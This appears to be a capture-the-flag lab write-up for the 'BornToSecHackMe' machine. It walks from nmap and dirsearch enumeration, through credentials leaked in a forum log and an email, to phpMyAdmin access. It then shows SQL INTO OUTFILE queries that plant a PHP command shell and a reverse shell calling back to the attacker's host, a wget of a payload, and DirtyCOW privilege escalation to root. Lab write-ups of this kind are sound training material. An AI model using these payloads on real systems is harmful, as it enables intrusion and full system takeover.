- set a network to the machine
- run nmap to locat the ip and the ports open on the mashine

  ```
  ➜  ~ nmap 192.168.56.0-255
  ```

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-23 18:22 +01
Nmap scan report for 192.168.56.1
Host is up (0.00047s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap scan report for 192.168.56.103
Host is up (0.00051s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 256 IP addresses (2 hosts up) scanned in 8.55 seconds

````
we see that the 192.168.56.103 machine contain some ports the 80 port lead to a standard page "try hack me page "

3 - using the dirsearch tool on https://192.168.56.103/ using http or https
    ```./dirsearch.py -u https://192.168.56.103/```

    we found this results:
    ```  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25
Wordlist size: 12289

Target: https://192.168.56.103/

[18:37:30] Scanning: 
[18:37:43] 403 -   291B - /cgi-bin/
[18:37:48] 301 -   318B - /forum  ->  https://192.168.56.103/forum/
[18:37:48] 200 -    5KB - /forum/
[18:37:54] 301 -   323B - /phpmyadmin  ->  https://192.168.56.103/phpmyadmin/
[18:37:55] 200 -    7KB - /phpmyadmin/index.php
[18:37:55] 200 -    7KB - /phpmyadmin/
[18:37:58] 403 -   296B - /server-status
[18:37:58] 403 -   297B - /server-status/
[18:38:04] 301 -   320B - /webmail  ->  https://192.168.56.103/webmail/
[18:38:04] 403 -   309B - /webmail/src/configtest.php

Task Completed
````

```./dirsearch.py

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25
Wordlist size: 12289

Target: http://192.168.56.103/

[18:38:16] Scanning: 
[18:38:28] 403 -   290B - /cgi-bin/
[18:38:30] 403 -   300B - /doc/stable.version
[18:38:30] 403 -   286B - /doc/
[18:38:30] 403 -   290B - /doc/api/
[18:38:30] 403 -   301B - /doc/html/index.html
[18:38:30] 403 -   301B - /doc/en/changes.html
[18:38:32] 301 -   316B - /fonts  ->  http://192.168.56.103/fonts/
[18:38:32] 403 -   287B - /forum
[18:38:32] 403 -   288B - /forum/
[18:38:32] 403 -   294B - /forum/admin/
[18:38:32] 403 -   307B - /forum/install/install.php
[18:38:32] 403 -   299B - /forum/phpmyadmin/
[18:38:34] 200 -    1KB - /index.html
[18:38:41] 403 -   295B - /server-status
[18:38:41] 403 -   296B - /server-status/

Task Completed
```

- so we have the status code 200 for '/index.html' and 301 for '/fonts' on port 80 this is not too nuch to use
- for the https we have many to do , status code 200 for '/forum/', '/phpmyadmin/', /phpmyadmin/index.php and 301 redirect to https://192.168.56.103/webmail/
- when we go to https://192.168.56.103/forum/ se found Probleme login ? - lmezard, 2015-10-08, 00:10 […] \[\*\] exploring content we see a password log `Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`
- using this password `!q\]Ej?*5K5cy*AJ` to login as `lmezard` will log us successfully  
  that can grant profile editing but that wont do much anyway under profile editing page we can see the email `laurie@borntosec.net` addres of lmezard we try to log using it ad the username on other pages "phpmyadmin, webmail " using the same password made us login to the webmail for now.
- navigating throw mails we can see \`\`\`	DB Access\`\` mail subject reading the content reveel the database access

````Hey

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.```

now we have a user and password for database!! 

- using the credentials root/Fg-'kKXBj87E:aJ$ for https://192.168.56.103/phpmyadmin/ grant access
there we can see sql , many atmpt to inject somthing the error log indicate that we can do it , i could not successfully inject a script file to the forum/ or phpmyadmin/ locations sens we do not have the write permission "#1 - Can't create/write to file " , so a dirsearch on forum/ help .
```[19:12:03] 403 -   319B - /forum/config/settings/production.yml
[19:12:03] 403 -   300B - /forum/config/xml/
[19:12:08] 200 -    1KB - /forum/images/
[19:12:08] 301 -   325B - /forum/images  ->  https://192.168.56.103/forum/images/
[19:12:09] 200 -    5KB - /forum/includes/
[19:12:09] 301 -   327B - /forum/includes  ->  https://192.168.56.103/forum/includes/
[19:12:09] 200 -    5KB - /forum/index.php
[19:12:09] 200 -    5KB - /forum/index
[19:12:09] 200 -    5KB - /forum/index.php/login/
[19:12:09] 301 -   321B - /forum/js  ->  https://192.168.56.103/forum/js/
[19:12:09] 200 -    2KB - /forum/js/
[19:12:10] 301 -   323B - /forum/lang  ->  https://192.168.56.103/forum/lang/
[19:12:12] 301 -   326B - /forum/modules  ->  https://192.168.56.103/forum/modules/
[19:12:12] 200 -    2KB - /forum/modules/
[19:12:22] 301 -   330B - /forum/templates_c  ->  https://192.168.56.103/forum/templates_c/
[19:12:22] 200 -    5KB - /forum/templates_c/
[19:12:22] 200 -   927B - /forum/themes/
[19:12:22] 301 -   325B - /forum/themes  ->  https://192.168.56.103/forum/themes/
[19:12:23] 301 -   325B - /forum/update  ->  https://192.168.56.103/forum/update/
````

we have many pages to navigate throw
succesfully injectd cmd php script file to templates_c/ , yup we can write to it

```SELECT
```

- we can execute it like that `curl https://192.168.56.103/forum/templates_c/test.php?cmd=pwd` or just as i did on the web page we get the working dir
- and

```
https://192.168.56.103/forum/templates_c/test.php?cmd=uname -a

Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```

a reverse shell will be better to navigat freeliy and get more maniability

sql injected

```
SELECT "<?php $s=fsockopen('192.168.56.105',1234);$proc=proc_open('/bin/sh -i',array(0=>$s,1=>$s,2=>$s),$pipes);?>"
INTO OUTFILE '/var/www/forum/templates_c/shellkali1.php'
```

```
SELECT "<?php $s=fsockopen('192.168.56.105',1234);$proc=proc_open('/bin/bash -i',array(0=>$s,1=>$s,2=>$s),$pipes);?>"
INTO OUTFILE '/var/www/forum/templates_c/shellkali1.php'
```

192.168.56.105: private ip hostonly interface connected to the server target
1234: port that will be listning on

we got the same informations just it easy this time.

```$
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 12.04.5 LTS
Release:        12.04
Codename:       precise
```

some research on the web we kan find that there is some vulnerabilitys on this kernel version Linux Kernel 2.6.22 < 3.9

- used an exploite programe from "https://dirtycow.ninja/" a list was found i used "https://github.com/FireFart/dirtycow/blob/master/dirty.c" dirty.c in scripts folder

we run p python simple http server on my host

```
python3 -m http.server 2244 
```

on the revers shell we do the wget to ge tthe downloaded file dirty.c

```
wget http://<myhost_ip>:2244/dirty.c
```

compiled with

```
gcc -pthread dirty.c -o dirty -lcrypt
```

we run the program

```
./dirty <new password>
```

we have to mv the new created passwd to the /etc/passwd

```bash
mv /tmp/passwd /etc/passwd
```

an error acured on the revers shell baypassed by this command

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

then

```bash
su  
su 
Password: 1234

root@BornToSecHackMe:/var/www/forum/templates_c# id
id
uid=0(root) gid=0(root) groups=0(root)
```

here you go we are root !!!